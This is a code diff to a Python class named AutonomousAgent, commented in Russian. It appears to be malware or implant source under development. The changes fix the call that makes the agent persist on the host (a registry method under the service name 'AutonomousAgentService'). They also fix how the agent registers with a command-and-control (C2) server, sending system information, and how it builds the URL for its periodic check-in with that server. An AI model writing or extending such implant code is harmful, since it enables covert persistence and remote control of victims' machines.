@@ -356,10 +356,11 @@ class AutonomousAgent:
             self.logger.info("Attempting to establish persistence...")
             try:
                 method = self.config.get('persistence', {}).get('default_method', 'registry')
-                success, message = self.persistence_manager.ensure_persistence(
-                     agent_path=self.executable_path,
+                success, message = self.persistence_manager.enable(
+                     executable_path=self.executable_path, # <<< Правильный аргумент
                      method=method,
-                     name="AutonomousAgentService" # Стандартное имя
+                     name="AutonomousAgentService", # Стандартное имя
+                     # args=None # Можно добавить аргументы запуска, если нужно
                  )
                 if success:
                     self.logger.info(f"Persistence established using method '{method}': {message}")
@@ -796,8 +797,9 @@ class AutonomousAgent:
         # <<< END DEBUG LOGGING >>>
 
         system_info = self._get_system_info()
-        # Добавляем уникальный UUID агента
-        system_info['agent_uuid'] = self.agent_uuid
+        # Добавляем уникальный UUID агента как agent_id
+        # system_info['agent_uuid'] = self.agent_uuid # <<< Старая строка
+        system_info['agent_id'] = self.agent_uuid # <<< Новый ключ - agent_id
 
         # <<< Получаем C2 из переменных окружения или конфига >>>
         c2_host = os.environ.get('C2_HOST')
@@ -860,10 +862,17 @@ class AutonomousAgent:
 
                     result = response.json()
                     if result.get('status') == 'success':
-                        self.agent_id = result.get('agent_id')
-                        logger.info(f"Successfully registered with C2 server {c2_url_base}. Agent ID: {self.agent_id}")
-                        registration_success = True
-                        break # Выходим из цикла C2 серверов при успехе
+                        # self.agent_id = result.get('agent_id') # <<< Старая строка: искали в корне
+                        agent_id_from_response = result.get('data', {}).get('agent_id') # <<< Ищем в data['agent_id']
+                        if agent_id_from_response:
+                             self.agent_id = agent_id_from_response
+                             logger.info(f"Successfully registered with C2 server {c2_url_base}. Agent ID: {self.agent_id}")
+                             registration_success = True
+                             break # Выходим из цикла C2 серверов при успехе
+                        else:
+                             logger.error(f"Registration successful on {c2_url_base}, but C2 did not return an agent_id in the 'data' field! Response: {result}")
+                             # Продолжаем пытаться с другими C2, если они есть?
+                             # Или считаем это ошибкой и останавливаемся? Пока продолжаем.
                     else:
                         logger.warning(f"Registration failed on {c2_url_base}: {result.get('message', 'Unknown error')}")
 
@@ -898,8 +907,36 @@ class AutonomousAgent:
             self._register_with_c2()
             if not self.agent_id: return # Выход, если регистрация снова не удалась
 
-        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
-        checkin_url = f"{c2_url_base}/agents/{self.agent_id}/checkin"
+        # c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}") # <<< Старая, некорректная строка
+
+        # <<< Получаем C2 из переменных окружения или конфига (как в _register_with_c2) >>>
+        c2_host = os.environ.get('C2_HOST')
+        c2_port = os.environ.get('C2_PORT')
+        c2_servers_from_env = []
+        if c2_host and c2_port:
+            scheme = "http" if not c2_host.startswith(("http://", "https://")) else ""
+            if scheme:
+                 c2_url_base_env = f"{scheme}://{c2_host}:{c2_port}"
+            else:
+                 c2_url_base_env = f"{c2_host}:{c2_port}"
+            c2_servers_from_env.append(c2_url_base_env)
+            logger.debug(f"Checkin loop using C2 from environment: {c2_url_base_env}")
+        
+        c2_servers_from_config = self.config.get('c2_servers', [])
+        # Приоритет у переменных окружения, берем первый адрес из подходящего списка
+        c2_servers = c2_servers_from_env or c2_servers_from_config
+        if not c2_servers:
+            logger.error("No C2 servers configured for check-in loop!")
+            return # Не можем продолжать без C2
+            
+        c2_url_base = c2_servers[0] # Берем первый C2 из списка для check-in
+        logger.debug(f"Checkin loop using C2 base URL: {c2_url_base}")
+        # <<< Конец получения C2 >>>
+        
+        # Формируем URL для check-in
+        # checkin_url = f"{c2_url_base}/checkin" # <<< Неверный URL (404)
+        checkin_url = f"{c2_url_base}/agents/{self.agent_id}/checkin" # <<< Возвращаем старый URL с ID агента
+        self.logger.debug(f"Checkin URL set to: {checkin_url}")
 
         while self.running:
             interval = self.config.get("checkin_interval", 60)
